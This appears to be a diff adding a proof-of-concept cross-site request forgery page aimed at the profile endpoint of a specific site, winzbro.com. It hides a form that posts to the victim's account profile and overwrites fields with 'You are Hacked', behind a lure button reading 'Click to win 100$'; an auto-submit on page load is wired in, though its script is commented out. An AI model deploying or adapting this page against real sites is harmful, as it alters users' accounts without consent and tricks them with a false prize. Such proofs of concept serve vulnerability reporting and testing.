@@ -1,0 +1,39 @@
+<html>
+	<head>
+		<title>CSRF</title>
+		<style type="text/css">
+			input {
+				display: none;
+			}
+		</style>
+	</head>
+
+	<body onload="onLoadSubmit()">
+		<form action="https://www.winzbro.com/en/account/profile" id="winzbro" method="POST" name="winzbro">
+			<input name="pv_nick" type="text" value="test2"/>
+			<br/>
+			<input name="pv_ic" type="text" value="1"/>
+			<br/>
+			<input name="pv_ib" type="text" value="1"/>
+			<br/>
+			<input name="pv_is" type="text" value="1"/>
+			<br/>
+			<input name="pv_video" type="text" value="You are Hacked"/>
+			<br/>
+			<input name="pv_social_tw" type="text" value="You are Hacked"/>
+			<br/>
+			<input name="pv_social_yt" type="text" value="You are Hacked"/>
+			<br/>
+			<input name="pv_br_m" type="text" value="You are Hacked"/>
+			<br/>
+			<input name="save_profile" type="text" value="1"/>
+			<br/>
+			<button type="submit">Click to win 100$</button>
+		</form>
+	<!--	<script language="javascript">function onLoadSubmit() {
+	document.winzbro.submit();
+} 
+
+</script> -->
+	</body>
+</html>
